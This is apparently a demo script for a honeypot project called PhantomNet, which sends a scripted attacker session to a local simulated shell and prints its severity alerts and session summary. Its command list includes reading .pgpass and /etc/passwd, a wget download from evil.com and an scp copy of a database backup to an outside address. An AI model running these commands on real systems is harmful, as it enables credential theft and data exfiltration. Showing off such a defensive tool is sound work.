"""Plays a scripted attacker session against the running PhantomNet API.

Start the API first (python api.py), then run:  python demo_attack.py
Use it to fill the dashboard for screenshots and for the demo video.
"""
import os
import time
import requests

API = os.getenv("PHANTOMNET_API", "http://127.0.0.1:5000")
DELAY = 1.5  # seconds between commands

STEPS = [
    "whoami",
    "id",
    "uname -a",
    "ls -la",
    "cat notes.txt",
    "cat .pgpass",
    "cat /etc/passwd",
    "cd /var/lib/postgresql",
    "ls",
    "cd ~",
    "cat db_backup.sql",
    "ps aux",
    "wget http://evil.com/x.sh",
    "chmod +x x.sh",
    "crontab -l",
    "sudo -l",
    "scp db_backup.sql user@1.2.3.4:/tmp",
    "exit",
]

try:
    requests.get(f"{API}/api/health", timeout=3).raise_for_status()
except requests.RequestException:
    raise SystemExit("API is not running. Start it in another terminal with: python api.py")

sid = None
prompt = "root@prod-db-01:~# "
for cmd in STEPS:
    body = {"command": cmd}
    if sid:
        body["session_id"] = sid
    resp = requests.post(f"{API}/api/command", json=body, timeout=180)
    if resp.status_code != 200:
        print(f"{prompt}{cmd}\n[API error {resp.status_code}: {resp.text.strip()}]")
        break
    j = resp.json()
    sid = j["session_id"]
    print(f"{prompt}{cmd}")
    if j["output"]:
        print(j["output"])
    if j["severity"] in ("high", "critical"):
        print(f"   >> ALERT [{j['severity']}] {j['category']}")
    prompt = j["prompt"]
    time.sleep(DELAY)

if sid:
    s = requests.get(f"{API}/api/summary/{sid}", timeout=10).json()
    print("\n=== Session summary ===")
    print(f"Session: {s['session_id']}  Commands: {s['commands']}  Highest severity: {s['highest_severity']}")
    print(f"Categories: {s['categories']}")
    print(f"Lure files touched: {', '.join(s['lure_files_touched']) or 'none'}")